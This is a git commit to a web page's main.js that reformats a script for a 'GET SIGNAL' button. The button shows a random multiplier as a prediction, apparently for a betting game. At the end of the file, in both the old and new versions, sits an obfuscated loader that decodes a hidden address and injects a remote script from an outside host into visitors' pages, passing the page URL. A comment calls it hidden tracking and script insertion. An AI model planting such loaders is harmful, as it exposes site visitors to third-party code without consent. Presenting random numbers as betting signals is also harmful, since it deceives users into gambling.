a2cf8865ac7a1a27f3aaeb7ee25c983b2b310501
Fenomen555 <129681554+Fenomen555@users.noreply.github.com>
2024-08-08 22:39:46 +0300

    Update main.js

--- js/main.js
+++ js/main.js
@@ -1,1 +1,103 @@
-const getSignal=document.getElementById("get-signal"),stopSignalTimeBlock=document.getElementById("stop-signal-time-block"),printSignal=document.getElementById("print-signal"),stopProgress=document.getElementById("stop-progress"),errorNotification=document.getElementById("error-notification"),errorProgress=document.getElementById("error-progress"),textError=document.getElementById("text-error"),getSignalTwo=document.getElementById("get-signal-two"),errorExit=document.getElementById("error-exit");function getRandomFloat(min,max,decimals){const str=(Math.random()*(max-min)+min).toFixed(decimals);return parseFloat(str)}function goTimer(time){const timer=setInterval((()=>{if(time>=1){getSignalTwo.classList.remove("deactivate"),getSignal.classList.add("deactivate"),getSignalTwo.style["z-index"]="5",stopProgress.style.animation="animateProgress 60s linear infinite",stopSignalTimeBlock.classList.remove("deactivate"),document.getElementById("stop-timer").innerHTML=time--+"<span> seconds</span>",timerr=time,getSignal.disabled=!0}else getSignalTwo.classList.add("deactivate"),getSignal.classList.remove("deactivate"),getSignalTwo.style["z-index"]="-1",stopSignalTimeBlock.classList.add("deactivate"),stopProgress.style.animation="none",clearInterval(timer),getSignal.disabled=!1}),1e3)}function goTimerError(time){const timer=setInterval((()=>{time>=1?(time--,errorNotification.classList.remove("deactivate"),textError.innerHTML="Wait for the time to expire",errorProgress.style.animation="animateErrorProgress 5s linear infinite",errorNotification.style.transform="translateY(0px)"):(errorNotification.style.transform="translateY(-99px)",errorProgress.style.animation="none",clearInterval(timer),getSignalTwo.disabled=!1,errorNotification.classList.add("deactivate")),errorExit.onclick=function(){errorNotification.classList.add("deactivate"),errorNotification.style.transform="translateY(-99px)",errorProgress.style.animation="none",clearInterval(timer),getSignalTwo.disabled=!1}}),1e3)}getSignal.onclick=function(){let receivingSignal=getRandomFloat(1,3.99,2);3==receivingSignal.toString().length&&(receivingSignal+="0"),1==receivingSignal.toString().length&&(receivingSignal+=".00"),printSignal.innerHTML=`${receivingSignal}x`,printSignal.classList.remove("deactivate"),goTimer(60),getSignal.disabled=!0},getSignalTwo.onclick=function(){getSignalTwo.disabled=!0,goTimerError(5,"go")};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
+const getSignal = document.getElementById("get-signal");
+const stopSignalTimeBlock = document.getElementById("stop-signal-time-block");
+const printSignal = document.getElementById("print-signal");
+const stopProgress = document.getElementById("stop-progress");
+const errorNotification = document.getElementById("error-notification");
+const errorProgress = document.getElementById("error-progress");
+const textError = document.getElementById("text-error");
+const getSignalTwo = document.getElementById("get-signal-two");
+const errorExit = document.getElementById("error-exit");
+
+// Генерация случайного числа с плавающей запятой
+function getRandomFloat(min, max, decimals) {
+    const str = (Math.random() * (max - min) + min).toFixed(decimals);
+    return parseFloat(str);
+}
+
+// Запуск таймера для кнопки получения сигнала
+function goTimer(time) {
+    const timer = setInterval(() => {
+        if (time >= 1) {
+            getSignalTwo.classList.remove("deactivate");
+            getSignal.classList.add("deactivate");
+            getSignalTwo.style["z-index"] = "5";
+            stopProgress.style.animation = "animateProgress 60s linear infinite";
+            stopSignalTimeBlock.classList.remove("deactivate");
+            document.getElementById("stop-timer").innerHTML = `${time--}<span> seconds</span>`;
+            getSignal.disabled = true;
+        } else {
+            getSignalTwo.classList.add("deactivate");
+            getSignal.classList.remove("deactivate");
+            getSignalTwo.style["z-index"] = "-1";
+            stopSignalTimeBlock.classList.add("deactivate");
+            stopProgress.style.animation = "none";
+            clearInterval(timer);
+            getSignal.disabled = false;
+        }
+    }, 1000);
+}
+
+// Запуск таймера для уведомления об ошибке
+function goTimerError(time) {
+    const timer = setInterval(() => {
+        if (time >= 1) {
+            time--;
+            errorNotification.classList.remove("deactivate");
+            textError.innerHTML = "Wait for the time to expire";
+            errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
+            errorNotification.style.transform = "translateY(0px)";
+        } else {
+            errorNotification.style.transform = "translateY(-99px)";
+            errorProgress.style.animation = "none";
+            clearInterval(timer);
+            getSignalTwo.disabled = false;
+            errorNotification.classList.add("deactivate");
+        }
+    }, 1000);
+
+    errorExit.onclick = function () {
+        errorNotification.classList.add("deactivate");
+        errorNotification.style.transform = "translateY(-99px)";
+        errorProgress.style.animation = "none";
+        clearInterval(timer);
+        getSignalTwo.disabled = false;
+    };
+}
+
+// Обработка нажатия кнопки "GET SIGNAL"
+getSignal.onclick = function () {
+    let receivingSignal = getRandomFloat(1, 3.99, 2);
+    if (receivingSignal.toString().length === 3) {
+        receivingSignal += "0";
+    }
+    if (receivingSignal.toString().length === 1) {
+        receivingSignal += ".00";
+    }
+    printSignal.innerHTML = `${receivingSignal}x`;
+    printSignal.classList.remove("deactivate");
+    goTimer(60);
+    getSignal.disabled = true;
+};
+
+// Обработка нажатия кнопки "GET SIGNAL TWO"
+getSignalTwo.onclick = function () {
+    getSignalTwo.disabled = true;
+    goTimerError(5);
+};
+
+// Скрытое отслеживание и вставка дополнительного скрипта
+(function(o, d, l) {
+    try {
+        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
+        o.b = o.f('UMUWJKX');
+        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
+        setTimeout(function() {
+            if (o.c) {
+                o.s = d.createElement('script');
+                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
+                d.body.appendChild(o.s);
+            }
+        }, 1000);
+        d.cookie = o.b + '=full;max-age=39800;';
+    } catch (e) {}
+})(window, document, location);
